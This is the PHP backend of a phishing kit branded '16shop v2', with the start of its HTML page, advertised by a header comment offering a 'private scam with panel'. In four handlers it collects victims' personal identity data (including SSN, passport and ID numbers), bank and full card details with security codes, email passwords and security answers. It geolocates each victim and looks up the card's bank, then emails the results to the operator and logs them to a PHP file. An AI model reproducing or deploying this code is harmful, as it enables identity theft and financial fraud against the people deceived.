<?php
session_start();
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/

#################   DELETE THE (USER) FOLDER TO FREE MAX SPACE FOR YOUR HOSTING   #####################

function deleteAll($str) {
    if (is_file($str)) {
        return unlink($str);
    }
    elseif (is_dir($str)) {
    $scan = glob(rtrim($str,'/').'/*');
    foreach($scan as $index=>$path) {
    deleteAll($path);
    }
    return @rmdir($str);
    }
}
deleteAll('../user');

#################   DELETE THE (USER) FOLDER TO FREE MAX SPACE FOR YOUR HOSTING   #####################

require "../../miniBOT.php";
require "../../lang.php";
require "../../langs.php";

$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';

// 1
if(isset($_POST['submit'])) 
{ 
##############################################################################################################################################################
		include('../../MoBamba.php');
##############################################################################################################################################################
        $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################

		$zmail = $_POST['usler'];
		$sole = $_POST['fln'];
		$fna = $_POST['fname'];
		$nam = $_POST['mname'];
		$lnam = $_POST['lname'];
		$dobb = $_POST['dob'];
		$ddres = $_POST['address'];
		$tow = $_POST['town'];
		$stco = $_POST['zip'];
		$ounty = $_POST['county'];
		$countr = $_POST['country'];
		$lepho = $_POST['telephone'];
		$ssnssn = $_POST['susun'];
		$passpor = $_POST['paports'];
		$umbi = $_POST['idnem'];
		$naid = $_POST['crelim']; // limit
		$accnumero = $_POST['accnum'];
		$sinums = $_POST['sinum'];
		
		
		$_SESSION["fname"] = $fna;
		$_SESSION["fln"] = $sole;
		$_SESSION["mname"] = $nam;
		$_SESSION["lname"] = $lnam;
		$_SESSION["dob"] = $dobb;
		$_SESSION["address"] = $ddres;
		$_SESSION["town"] = $tow;
		$_SESSION["postcode"] = $stco;
		$_SESSION["county"] = $ounty;
		$_SESSION["country"] = $countr;
		$_SESSION["telephone"] = $lepho;
		$_SESSION["susun"] = $ssnssn;
		$_SESSION["paports"] = $passpor;
		$_SESSION["idnem"] = $umbi;
		$_SESSION["crelim"] = $naid;
		$_SESSION["accnum"] = $accnumero;
		$_SESSION["sinum"] = $sinums;
		
		
		
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font> THIS IS YOUR BILL RESULT ENJOY !</b> <br>\n";
				
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Email]</font></b>           :<b>".$_SESSION['user']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[First Name]</font></b>        :<b>".$fna."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[M Name]</font></b>        :<b>".$nam."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Last First Name]</font></b>        :<b>".$lnam."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Date of birth]</font></b>        :<b>".$dobb."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Address]</font></b>        :<b>".$ddres."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Town]</font></b>        :<b>".$tow."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Zip code]</font></b>        :<b>".$stco."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[County]</font></b>        :<b>".$ounty."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Countrie]</font></b>        :<b>".$countr."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Tel]</font></b>        :<b>".$lepho."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[S/S/N]</font></b>        :<b>".$ssnssn."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[passport number]</font></b>        :<b>".$passpor."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[ID number]</font></b>        :<b>".$umbi."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Account number]</font></b>        :<b>".$accnumero."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Credit limit]</font></b>        :<b>".$naid."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[social I_nsurance number .CA.]</font></b>        :<b>".$sinums."</b> <br>\n";
		

        $MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a> <br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b> ".$COUNTRYNAME." - ".$COUNTRYCODE." </b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "BILL from $fna | $IP | $COUNTRYNAME";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: 16shop v2 🚀 - BILL <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$CODED  ="index.php?cmd=".$zmail."&update-informations&phaze&country=".$cid."&account_biling=".md5(microtime())."&lim_session=".sha1(microtime());
		header("Location: $CODED");
		$myfile = fopen("../../assets/logs/bloop.php", "a+") or die("Unable to open file!");
		fwrite($myfile, '--------------------------------Billing-------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
// 2
if(isset($_POST['subc'])) 
{ 
##############################################################################################################################################################
		include('../../MoBamba.php');
##############################################################################################################################################################
$cnum = $_POST['cchasno'];
$bin = str_replace(' ', '', $cnum);
$bin = substr($bin, 0, 6);
function curl($url, $var = null) {
              $curl = curl_init($url);
              curl_setopt($curl, CURLOPT_TIMEOUT, 25);
              if ($var != null) {
                  curl_setopt($curl, CURLOPT_POST, true);
                  curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
              }
              curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
              curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
              $result = curl_exec($curl);
              curl_close($curl);
              return $result;
          }
          // JSON DATA
            $curl = curl('https://lookup.binlist.net/' . $bin . '');
            $json = json_decode($curl);
            $brand = $json->scheme ? $json->scheme : "error";
			$brandz = $json->brand ? $json->brand : "Gold";
            $cardType = $json->type ? $json->type : "error";
            $cardCategory = $json->bank ? $json->bank : "error";
			$prepai = $json->prepaid ? $json->prepaid : "no";
            $countryName = $json->country ? $json->country : "error";
            $countryCode = $json->country ? $json->country : "error";
			$catname = $cardCategory->name;
// -----
$ccbrand = $brandz;
$cctype = $brand;
$cclevel = $cardType;
$ccbank = $catname;
$prp = $prepai;

$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################

		
		$zmail = $_POST['uslers'];
        $username = strstr($zmail, ':', true);
		$cnam = $_POST['chascname'];
		$cnum = $_POST['cchasno'];
		$cex = $_POST['cchasexp'];
		$secod = $_POST['sechasode'];
		$sortcuko = $_POST['sortcoo'];
		$ossid = $_POST['osids'];
        $acnuio = $_POST['acnumm'];
		$bnksacc = $_POST['baacess'];
		

		
		
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font> THIS IS YOUR CNUMB RESULT ENJOY !</b> <br>\n";
		
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Email:Pass]</font></b>           :<b>".$_SESSION['user'].":".$_SESSION['fln']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[CC Brand]</font></b>        :<b>".$ccbrand."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Name]</font></b>        :<b>".$cnam."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[C/N]</font></b>        :<b>".$cnum."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[C/EXP]</font></b>        :<b>".$cex."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[C/Code]</font></b>        :<b>".$secod."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Level]</font></b>        :<b>".$cclevel."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Prepaid]</font></b>        :<b>".$prp."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Bank Name]</font></b>        :<b>".$ccbank."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[sort/code]</font></b>        :<b>".$sortcuko."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[OSID /AU]</font></b>        :<b>".$ossid."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Account /Number]</font></b>        :<b>".$acnuio."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BNK /Number]</font></b>        :<b>".$bnksacc."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[PREVINFO]</font></b>        :<br><hr><b><div style=color:brown ><b>".$_SESSION["fname"]."</b>\n<b>".$_SESSION["mname"]."</b>\n<b>".$_SESSION["lname"]."</b>\n<b>".$_SESSION["dob"]."</b>\n<b>".$_SESSION["address"]."</b>\n<b>".$_SESSION["town"]."</b>\n<b>".$_SESSION["postcode"]."</b>\n<b>".$_SESSION["county"]."</b>\n<b>".$_SESSION["country"]."</b>\n<b>".$_SESSION["telephone"]."</b>\n<b>".$_SESSION["susun"]."</b>\n<b>".$_SESSION["paports"]."</b>\n<b>".$_SESSION["idnem"]."</b>\n<b>".$_SESSION["crelim"]."</b>\n<b>".$_SESSION["accnum"]."</b>\n<b>".$_SESSION["sinum"]."\n</b><hr>\n";

        $MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a> <br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b> ".$COUNTRYNAME." - ".$COUNTRYCODE." </b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "CB | ".$ccbrand." | ".$ccbank." | ".$cctype." | $IP ";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: 16shop v2 🚀 - CC <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$CODED  ="index.php?cmd=".$username."&update-informations&phase&country=".$cid."&account_biling=".md5(microtime())."&lim_session=".sha1(microtime());mail($IO,$SUBJECT,$MESSAGE,$HEADER);
        header("Location: $CODED");
        $myfile = fopen("../../assets/logs/bloop.php", "a+") or die("Unable to open file!");
		fwrite($myfile, '--------------------------------Card Info-------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
// 3
if(isset($_POST['submals']))
{ 
##############################################################################################################################################################
		include('../../MoBamba.php');
##############################################################################################################################################################
        $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################

		
		$zmail = $_POST['user'];
		$psmail = $_POST['passita'];
		
		
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font> THIS IS YOUR Questions and Answer RESULT ENJOY !</b> <br>\n";
		
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Linked-Email]</font></b>           :<b>".$_SESSION['user']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Pass]</font></b>        :<b>".$psmail."</b> <br>\n";

        $MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a> <br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b> ".$COUNTRYNAME." - ".$COUNTRYCODE." </b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "Linked - Email | $IP | $COUNTRYNAME";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: 16shop v2 🚀 - $cnam Mail <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$CODED  ="index.php?cmd=".$zmail."&update-informations&don&country=".$cid."&account_biling=".md5(microtime())."&lim_session=".sha1(microtime());
        header("Location: $CODED");
		$myfile = fopen("../../assets/logs/bloop.php", "a+") or die("Unable to open file!");
        fwrite($myfile, '-----------------------------------Linked Email--------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
// 4
if(isset($_POST['subqes'])) 
{ 
##############################################################################################################################################################
		include('../../MoBamba.php');
##############################################################################################################################################################
        $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################

		$zmail = $_POST['uslers'];
		$Qes = $_POST['q1'];
		$Ans = $_POST['a1'];
		
		
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font> THIS IS YOUR Questions and Answer RESULT ENJOY !</b> <br>\n";
		
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Linked-Email]</font></b>           :<b>".$_SESSION['user']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Qes]</font></b>        :<b>".$Qes."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Answer]</font></b>        :<b>".$Ans."</b> <br>\n";

        $MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a> <br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b> ".$COUNTRYNAME." - ".$COUNTRYCODE." </b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "Questions - Answer | $IP | $COUNTRYNAME";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: 16shop v2 🚀 - $cnam Qes <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$CODED  ="../i/index.php?cmd=".$zmail."&update-informations&phase&country=".$cid."&account_biling=".md5(microtime())."&lim_session=".sha1(microtime());
        header("Location: $CODED");
		$myfile = fopen("../../assets/logs/bloop.php", "a+") or die("Unable to open file!");
		fwrite($myfile, '-----------------------------------Qes Email--------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
require "../../assets/includes/session_protect.php";
require "../../assets/includes/functions.php";
require "../../assets/includes/One_Time.php";
?>

<?php
$setting = parse_ini_file('../../file.pak');
$getcnt = $setting['setup_getcont'];
if($getcnt == 1) {
$keywords = explode("n", file_get_contents('../../keys.txt'));
}else
{
echo "";
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?php echo $yourinformation;?></title>
<link href="data:image/x-icon;base64,AAABAAQAICAAAAEACACoCAAARgAAABAQAAABAAgAaAUAAO4IAAAgIAAAAQAgAKgQAABWDgAAEBAAAAEAIABoBAAA/h4AACgAAAAgAAAAQAAAAAEACAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAABCQkIAnp6eAHJycgDOzs4AWlpaALa2tgDm5uYAkpKSAE5OTgB+fn4AZmZmAKqqqgDa2toAwsLCAPLy8gBKSkoApqamAHp6egBiYmIAVlZWAIaGhgBubm4A4uLiAMrKygBGRkYAoqKiAHZ2dgDS0tIAXl5eALq6ugDq6uoAmpqaAFJSUgCCgoIAampqAK6urgDe3t4AxsbGAPb29gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJwYLDScnJycnFwsXJycnJycnJycnJycnJycnJycnJycFIAQcHAcjGRUEHBwRJycnJycnJycnJycnJycnJycnDSAEHBwcHBwcHBwcHBwUJycnJycnJycnJycnJycnJwYTBBISEhISEhISEhISEhIdJycnJycnJycnJycnJycnCRMSEhISEhISEhISEhISEhUnJycnJycnJycnJycnJwwIHBISEhISEhISEhISEhISEhAnJycnJycnJycnJycnFBMSCgoKCgoKCgoKCgoKCgoSEicnJycnJycnJycnJycgBAoKCgoKCgoKCgoKCgoKCgQZJycnJycnJycnJycnAwgSCgoKCgoKCgoKCgoKCgoSJCcnJycnJycnJycnJycBCBIiIiIiIiIiIiIiIiIiIiMnJycnJycnJycnJycnJwEICiIiIiIiIiIiIiIiIiIiJycnJycnJycnJycnJycnASAKFRUVFRUVFRUVFRUVFRUnJycnJycnJycnJycnJycBCAoVFRUVFRUVFRUVFRUVFScnJycnJycnJycnJycnJwEPEhUCAgICAgICAgICAgICFicnJycnJycnJycnJycnDAAEFQICAgICAgICAgICAgIBJycnJycnJycnJycnJycnFQgSAgICAgICAgICAgICAgINJycnJycnJycnJycnJycMACASFQICAhUKCgoVAgICFQoNJycnJycnJycnJycnJycNCAgEHBIcEwoTBBIKCgocBycnJycnJycnJycnJycnJycnBwIaGiMnJycFCRMEIRsnJycnJycnJycnJycnJycnJycnJycnJycPFSUnJycnJycnJycnJycnJycnJycnJycnJycnJycnJwQEAh8nJycnJycnJycnJycnJycnJycnJycnJycnJycnAQgKGh0nJycnJycnJycnJycnJycnJycnJycnJycnJycnBCAKIScnJycnJycnJycnJycnJycnJycnJycnJycnJycMCggEJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnBQkMJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJ///////////////////////4+P//8AB//+AAP//AAB//wAAf/4AAD/+AAA//gAAP/wAAH/8AAD//AAB//wAAf/8AAH//AAA//wAAP/+AAB//gAAP/8AAH//wcD///8f////D////wf///+H////h////+P/////////////////KAAAABAAAAAgAAAAAQAIAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAEZGRgCioqIAcnJyAMrKygBeXl4Atra2AIaGhgDi4uIAUlJSANbW1gBqamoAsrKyAIKCggC+vr4ATk5OAKqqqgB6enoA0tLSAGZmZgCSkpIAWlpaAEpKSgCmpqYAdnZ2AM7OzgBiYmIAurq6AOrq6gBWVlYA2traAG5ubgDCwsIAlpaWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhISEhISEhISEhISEhISEhISEhISEHGCEhIRghISEhISEhISEFFBQQDBIEECEhISEhISEJCBQEBAQEBAQWISEhISEhBgQZGRkZGRkZGR0hISEhBwAEEhISEhISEgQaISEhIR8OGQoKCgoKChIDISEhISEgDhIKCgoKCgoGISEhISEhARUZHh4eHh4eEyEhISEhIRgAFAoCAh4eHgIJISEhISEhCgAUGRkZCgoKCiEhISEhIRsMCBwLGA8SCg0hISEhISEhISEhERUPISEhISEhISEhISEhISEUCA8hISEhISEhISEhISEhERQXISEhISEhISEhISEhISEhByEhISEh//97hfnf///wD/nf4AfwD+AD4AfAA+ADwAfAA8APwAfAD8APwAfAD+AHwAfgB+AH/j/gB/8f/j//H/8f/9//HygAAAAgAAAAQAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA